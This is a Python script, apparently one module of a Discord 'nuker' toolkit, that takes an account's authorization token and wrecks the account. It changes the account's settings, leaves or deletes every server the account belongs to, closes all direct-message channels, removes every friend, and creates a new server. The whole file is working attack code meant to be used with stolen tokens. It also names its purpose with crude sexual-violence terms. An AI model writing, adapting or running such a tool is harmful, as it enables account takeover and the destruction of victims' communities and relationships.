from re import M
import requests, time, sys, os, ctypes
from colorama import Fore

def tokenrape():
    os.system(f'title Token Rape - Made by Astraa')
    os.system('cls')
    tokenrapetitle()
    print(f"""{y}[{w}+{y}]{w} Enter the token of the account you want to rape: """)
    token = str(input(f"""{y}[{b}#{y}]{w} Token: """))
    try:
        headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Authorization' : token
        }

        payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

        print(f"""\n\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} Changeing settings""")
        input(f"""{y}[{b}#{y}]{w} Press ENTER to Changing Settings""")
        requests.patch(
            "https://canary.discordapp.com/api/v6/users/@me/settings",
            headers = headers,
            json = payload
        )
        print(f"\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} Detecting servers\n")
        time.sleep(1)

        guilds = requests.get(
            "https://discord.com/api/v6/users/@me/guilds",
            headers = headers
        ).json()

        print(f"""          {y}[{w}+{y}]{w} {len(guilds)} servers found\n""")
        input(f"""{y}[{b}#{y}]{w} Press ENTER to leave all Servers""")

        for i in guilds:
            try:
                print(f"""          {y}[{Fore.LIGHTRED_EX }!{y}]{w} Leaving {i['name']} | Owner: {i['owner']}""")
                if not i["owner"]:
                    responce = requests.delete(
                        f"https://discord.com/api/users/@me/guilds/{i['id']}",
                        headers = headers
                    )
                else:
                    responce = requests.delete(
                        f"https://discord.com/api/guilds/{i['id']}",
                        headers = headers
                    )
            except Exception as e:
                print(e)

        print(f"\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} Detecting DM channels\n")
        time.sleep(1)

        dms = requests.get(
            "https://discord.com/api/v6/users/@me/channels",
            headers = headers
        ).json()
        print(f"""          {y}[{w}+{y}]{w} {len(guilds) - 1} DM channels found\n""")
        input(f"""{y}[{b}#{y}]{w} Press ENTER to leave all DM""")

        for i in dms:
            print(f"""          {y}[{Fore.LIGHTRED_EX }!{y}]{w} Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}""")
            responce = requests.delete(
                f"https://discord.com/api/channels/{i['id']}",
                headers = headers
            )

        print(f"\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} Detecting relationships\n")
        time.sleep(1)

        relations = requests.get(
        "https://discord.com/api/v8/users/@me/relationships",
        headers = headers
        ).json()

        relations = [i for i in relations if i["type"] != 0]

        print(f"""          {y}[{w}+{y}]{w} {len(relations)} relationships found""")
        input(f"""{y}[{b}#{y}]{w} Press ENTER to remove all friends""")

        for i in relations:
            print(f"""\n          {y}[{Fore.LIGHTRED_EX }!{y}]{w} Removing {i['user']['username']} from relationships""")
            responce = requests.put(
                f"https://discord.com/api/v8/users/@me/relationships/{i['user']['id']}",
                headers = headers,
                json = {"type":0}
            )

        guild = {
            "channels" : None,
            "icon" : "https://www.pngmagic.com/product_images/three-hearts-png.png",
            "name" : "Love U",
            "region" : "japan"
        }
        requests.post(
            'https://discordapp.com/api/v6/guilds',
            headers = headers,
            json = guild
        )

        print(f"""\n\n{y}[{b}#{y}]{w} Account has been successfully raped""")
        input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")

    except:
        print(f"""      {y}[{Fore.LIGHTRED_EX }!{y}]{w} There is a problem with your Token.""")
        time.sleep(2)
        os.system('cls')
        main()

tokenrape()